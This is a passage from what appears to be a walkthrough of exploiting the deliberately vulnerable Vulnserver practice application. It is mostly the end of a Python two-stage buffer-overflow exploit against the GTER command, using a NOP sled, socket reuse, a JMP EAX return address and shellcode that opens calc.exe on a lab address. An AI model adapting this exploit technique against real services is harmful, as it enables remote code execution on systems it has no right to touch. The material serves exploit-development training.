buf += b"\xcd\x4a\x82\x07\x90\xd8\x4e\xe6\x37\x59\xf4\xf6"

payload=b""
payload+=b"\x90"*40
payload+=file_descriptor
payload+=stack_adjustment
payload+=flag_value
payload+=buffer_size
payload+=buffer_pointer
payload+=get_file_descriptor
payload+=socket_recv
payload+=b"\x90"*(100-len(payload))
payload+=b"\x90"*51
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"

stage1=b""
stage1+=payload

stage2=b""
stage2+=buf
stage2+=b"\x90"*(1024-len(buf))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))

print("[+] Sending STAGE 1 payload")
s.send((b"GTER "+stage1))
sleep(5)

print("[+] Sending STAGE 2 payload")
s.send(stage2)

print("[+] Exploit complete.. calc.exe popped")
s.close()
sys.exit()
```

After running this, we could successfully pop the ```calc.exe``` from the Vulnserver

<video width="100%" preload="auto" muted controls>
    <source src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-2-exploit.mp4" type="video/mp4"/>
</video>
